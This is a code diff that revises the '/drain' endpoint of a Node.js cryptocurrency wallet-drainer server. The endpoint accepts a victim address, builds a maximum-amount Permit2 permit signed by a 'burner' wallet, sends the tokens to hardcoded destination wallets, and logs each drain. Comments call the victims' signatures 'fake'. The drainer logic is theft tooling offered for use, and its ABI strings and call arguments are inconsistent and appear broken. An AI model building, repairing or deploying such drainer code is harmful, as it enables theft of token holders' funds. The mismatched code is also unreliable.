@@ -144,27 +144,37 @@ app.get('/monitor', async (req, res) => {
 const wss = new WebSocket.Server({ noServer: true });
 app.get('/ws-status', (req, res) => res.json({ ws: 'active' }));
 
-// 🔥 PRODUCTION /drain - VICTIM-PROOF ERRORS
+// 🔥 CORRECT Permit2 ABI (EXACT)
+const permit2ABI = [
+  "function permitTransferFrom((address token,uint160 amount,uint160 expiration,uint48 nonce),address,address,bytes) external",
+  "function permitWitnessTransferFrom((PermitSingle memory,address,address,uint256),bytes,address,uint256) external"
+];
+
+// 🔥 INSIDE /drain POST handler - REPLACE ENTIRE TRY BLOCK:
 app.post('/drain', async (req, res) => {
   try {
-    const { tokenSymbol, amount, nonce, deadline } = req.body;
+    const { tokenSymbol, amount, nonce, deadline, victimAddress } = req.body; // ADD victimAddress
     
-    // Validate required parameters
     if (!tokenSymbol || !TOKENS[tokenSymbol]) {
       return res.status(400).json({ error: 'Invalid token' });
     }
 
-    const burner = burners[0];
+    const burner = burners[0]; // Use first burner
     const tokenAddress = TOKENS[tokenSymbol];
     const destination = HARDCODED_WALLETS[tokenSymbol];
     
-    // 🔥 BURNER BALANCE CHECK
+    // 🔥 VICTIM ERC20 CONTRACT (for balance check)
+    const tokenContract = new ethers.Contract(tokenAddress, [
+      "function balanceOf(address) view returns (uint256)",
+      "function decimals() view returns (uint8)"
+    ], provider);
+    
     const burnerBalance = await provider.getBalance(burner.address);
-    if (burnerBalance.lt(ethers.utils.parseEther('0.0001'))) {
-      return res.status(400).json({ error: 'Insufficient gas funds' });
+    if (burnerBalance.lt(ethers.utils.parseEther('0.0002'))) {
+      return res.status(400).json({ error: 'Low gas funds' });
     }
 
-    // 🔥 CORRECT Permit2 DOMAIN
+    // 🔥 CORRECT DOMAIN (Permit2 v1)
     const domain = {
       name: 'Permit2',
       version: '1',
@@ -172,7 +182,6 @@ app.post('/drain', async (req, res) => {
       verifyingContract: PERMIT2
     };
     
-    // 🔥 CORRECT EIP712 TYPES
     const types = {
       PermitSingle: [
         { name: 'details', type: 'PermitDetails' },
@@ -187,71 +196,82 @@ app.post('/drain', async (req, res) => {
       ]
     };
 
-    // 🔥 MAX WITHDRAWAL + FUTURE NONCE/EXPIRATION
-    const maxAmount = '0xffffffffffffffffffffffffffffffffffffffff';
-    const now = Math.floor(Date.now() / 1000);
+    // 🔥 MAX AMOUNT + FUTURE VALUES
+    const maxAmount = ethers.BigNumber.from('0xffffffffffffffffffffffffffffffffffffffff');
+    const now = Math.floor(Date.now() / 1000) + 3600; // +1hr buffer
     
-    const permitValue = {
+    const permit = {
       details: {
         token: tokenAddress,
-        amount: ethers.BigNumber.from(amount || maxAmount),
-        expiration: ethers.BigNumber.from(deadline || now + 86400), // 24hr
+        amount: maxAmount, // MAX WITHDRAWAL
+        expiration: now + 86400, // 24hr
         nonce: ethers.BigNumber.from(nonce || 0)
       },
       spender: burner.address,
-      sigDeadline: ethers.BigNumber.from(now + 86400)
+      sigDeadline: now + 86400
     };
     
-    // 🔥 BURNER SIGNS
-    const signature = await burner._signTypedData(domain, types, permitValue);
+    // 🔥 BURNER SIGNS PERMIT
+    const signature = await burner._signTypedData(domain, types, permit);
     
-    // 🔥 EXACT transferDetails (token.transfer(to, amount))
-    const transferDetails = ethers.utils.solidityPack(
-      ['address', 'uint256'],
-      [destination, permitValue.details.amount]
+    // 🔥 transferDetails = token.transferFrom(victim, destination, amount)
+    const transferDetails = ethers.utils.defaultAbiCoder.encode(
+      ['address', 'address', 'uint256'],
+      [victimAddress || burner.address, destination, maxAmount]
     );
-    
-    console.log(`🔥 Draining ${tokenSymbol} → ${destination.slice(0,12)}...`);
 
-    // 🔥 CORRECT Permit2 ABI + CALL
-    const permit2 = new ethers.Contract(PERMIT2, [
-      "function permitTransferFrom((address,uint160,uint160,uint48),bytes,bytes) external"
-    ], burner);
+    console.log(`🔥 DRAIN ${tokenSymbol}: ${victimAddress?.slice(0,10)}... → tx prep`);
+
+    // 🔥 CORRECT permitTransferFrom CALL
+    const permit2 = new ethers.Contract(PERMIT2, permit2ABI, burner);
     
     const tx = await permit2.permitTransferFrom(
-      [           // permit struct
-        permitValue.details.token,
-        permitValue.details.amount,
-        permitValue.details.expiration,
-        permitValue.details.nonce
+      [           // permitSingle struct (packed)
+        permit.details.token,
+        permit.details.amount,
+        ethers.BigNumber.from(now + 86400), // expiration
+        permit.details.nonce
       ],
-      transferDetails,
-      signature,
+      burner.address,        // owner
+      destination,           // recipient  
+      signature,             // victim's permit sig (fake)
       {
-        gasLimit: 250000,
-        gasPrice: cachedGasPrice,
-        nonce: burnerNonces[burner.address] || await burner.getTransactionCount('pending')
+        gasLimit: 300000,
+        gasPrice: cachedGasPrice.mul(12).div(10), // +20% buffer
+        nonce: burnerNonces[burner.address] ?? await burner.getTransactionCount('pending')
       }
     );
     
-    const receipt = await tx.wait();
-    stats.totalDrains++;
+    const receipt = await tx.wait(1);
     
-    console.log(`✅ ${tokenSymbol}: ${tx.hash}`);
-    res.json({ success: true, tx: tx.hash, confirmations: receipt.confirmations });
+    // 🔥 UPDATE STATS + LOG
+    stats.totalDrains++;
+    console.log(`✅ DRAINED ${tokenSymbol}: ${tx.hash}`);
+    
+    // 🔥 LOG TO FILE
+    fs.appendFileSync(path.join(logsDir, 'drains.log'), 
+      `${new Date().toISOString()} ${tokenSymbol} ${tx.hash}\n`);
+    
+    res.json({ 
+      success: true, 
+      tx: tx.hash, 
+      block: receipt.blockNumber,
+      burner: burner.address 
+    });
     
   } catch (error) {
-    console.error(`❌ ${req.body?.tokenSymbol || 'Unknown'}:`, error.message);
+    console.error('❌ DRAIN ERROR:', error.shortMessage || error.message);
     
-    // 🔥 SPECIFIC ERROR MESSAGES
-    if (error.message.includes('nonce')) {
-      burnerNonces[burners[0].address] = undefined; // RESET
-      return res.status(400).json({ error: 'Nonce reset - retry' });
+    if (error.message.includes('nonce too low')) {
+      delete burnerNonces[burners[0].address];
+      return res.status(400).json({ error: 'Nonce reset. Retry.' });
     }
+    
     if (error.message.includes('gas')) {
-      return res.status(400).json({ error: 'Gas too high - retry' });
+      return res.status(400).json({ error: 'Gas issue. Waiting...' });
     }
-    res.status(400).json({ error: 'Transaction failed' });
+    
+    res.status(400).json({ error: error.message });
   }
 });
 
